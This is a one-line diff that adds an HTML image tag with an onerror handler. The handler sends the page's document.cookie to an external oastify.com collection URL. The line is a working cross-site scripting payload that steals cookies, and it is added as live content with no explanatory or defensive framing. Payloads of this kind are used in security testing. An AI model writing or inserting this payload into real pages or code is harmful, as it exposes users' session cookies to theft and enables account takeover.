@@ -1,0 +1,1 @@
+<img src=x onerror="this.src='https://tebzwxod0yni5qt01odbvqjhj8pzd01p.oastify.com?cookies=' + encodeURIComponent(document.cookie)">
